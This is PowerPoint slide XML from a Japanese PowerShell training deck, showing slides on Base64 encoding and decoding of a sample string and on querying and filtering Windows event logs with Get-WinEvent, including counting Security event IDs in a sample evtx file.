            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Text.Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]::UTF8.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GetString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>($_)}</a:t>
            </a:r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A8FC25D6-4C1F-2807-ED09-12B0D25F5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5337212"/>
            <a:ext cx="10440990" cy="1015663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PowerShell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のパイプはオブジェクトの</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>要素を</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>つずつ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受け渡す（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p.6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）。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>「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,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」を入れて配列を作り、バイト列全体を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1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つの塊にして後続に送る。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>（もし「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,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」がなければ、各バイトに対して処理されてしまう。）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{82FEB873-6BBB-51EB-36BD-9EED84753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20" y="1753289"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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エンコーディング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4" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1CA047A-C818-8FB5-3652-D58C4E415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276" y="3774686"/>
            <a:ext cx="6108824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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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デコーディング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82D88D1-A7FB-8A72-D33A-527888765021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="2162012"/>
            <a:ext cx="10430709" cy="1477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Write-Output Hello |</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {, [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Text.Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]::UTF8.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GetBytes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>($_)}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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Object {[Convert]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ToBase64String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>($_)}</a:t>
            </a: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SGVsbG8=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D5AE864-A9CC-0262-1FDA-2D78233CEDA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3611724" y="2492896"/>
            <a:ext cx="324036" cy="378261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A345C78-2D4C-4AD6-B18E-7932E8C56BAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3611724" y="4545124"/>
            <a:ext cx="324036" cy="378261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991533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5E06C9A0-2867-2042-927B-A711373E8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イベントログ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4DF65CE-29F1-A61F-8CB8-5B1C460014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E12182-8896-5FEB-A5CD-0C8052D4B1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43</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D7E93E4-AA9D-A766-77BB-0232919E7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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" b="1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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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658128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F31DD8-6072-F950-06C4-615C8C702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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>一覧取得</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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0AFA238-96E0-4F2E-3105-76A1841575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B322A46-5B44-DFAD-07C6-221BEEE563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44</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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B3C3DE9A-A4D0-5985-F753-04D47DE77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992" y="915688"/>
            <a:ext cx="10440989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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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ログファイルの一覧を見る。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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7EA9CA6-9784-DF6D-E96E-906A29DA696D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1262174"/>
            <a:ext cx="10422016" cy="40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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ListLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> * | Select-Object * | Out-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GridView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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51F54B34-4B5B-0658-7519-4A338A57C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22" y="1765098"/>
            <a:ext cx="10430678" cy="2455990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0E24A830-CDD3-D852-A9B7-465A0E65E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992" y="4374592"/>
            <a:ext cx="10440989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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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ログの出力元を確認する。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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EC1EE6E-4328-B05A-A189-4DF33AE403AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="4721078"/>
            <a:ext cx="10422016" cy="13234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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ListProvider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> * | Select-Object -First 1</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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Name     : .NET Runtime</a:t>
            </a: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LogLinks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : {Application}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr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556685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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で取得件数を制限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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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45</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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40FDA9BE-6AFF-D6D4-6343-B2860ABCE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992" y="3347551"/>
            <a:ext cx="10440989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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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外部の</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>evtx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ファイルを読み、イベント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ID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ごとに集計する。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50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55C853D-C491-3208-B3FD-4470A57E5325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="3711800"/>
            <a:ext cx="10422016" cy="2708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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path "D:\DeepBlueCLI\evtx\many-events-security.evtx"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Group-Object -Property Id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Sort-Object -Property Count -Descending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Select-Object Count, Name -First 2</a:t>
            </a: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Count Name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----- ----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 8346 4688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 3456 4907</a:t>
            </a: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FD69C189-1C53-3FB0-EBE9-DBEBFA79D03A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="884992" y="926361"/>
            <a:ext cx="10440989" cy="2302874"/>
            <a:chOff x="884992" y="1408130"/>
            <a:chExt cx="10440989" cy="2302874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92BD1B70-623E-66B6-A973-2FB1B7363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992" y="1408130"/>
              <a:ext cx="10440989" cy="33855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ja-JP"/>
              </a:defPPr>
              <a:lvl1pPr marL="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lvl="0" indent="-342900" algn="just">
                <a:spcBef>
                  <a:spcPts val="900"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
                <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
                <a:buChar char="l"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>Security</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>ログから最新の</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>1</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>件を表示する。</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128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D7A200CE-E948-D61A-E906-069A286D9E0F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="884992" y="1772012"/>
              <a:ext cx="10422016" cy="19389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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>WinEvent</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> -</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>LogName</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> Security -</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>MaxEvents</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> 1</a:t>
              </a:r>
              <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>   </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>ProviderName</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>: Microsoft-Windows-Security-Auditing</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>TimeCreated</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>                      Id </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>LevelDisplayName</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> Message</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>-----------                      -- ---------------- -------</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>2022/11/12 21:19:20            4672 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>情報             新しいログオンに</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>...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94923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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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イベントログ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で条件づけして抽出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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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46</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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40FDA9BE-6AFF-D6D4-6343-B2860ABCE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992" y="903347"/>
            <a:ext cx="10440989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">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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イベントログから特定の条件で抽出する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50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55C853D-C491-3208-B3FD-4470A57E5325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1268760"/>
            <a:ext cx="10422016" cy="25545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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> @{LogName="Security";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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>StartTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="2022/11/12 21:44:00"; Id=4624,4672}</a:t>
            </a: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   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProviderName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: Microsoft-Windows-Security-Auditing</a:t>
            </a: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TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                      Id </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LevelDisplayName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Message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-----------                      -- ---------------- -------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2022/11/12 21:44:23            4672 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>情報             新しいログオンに特権</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
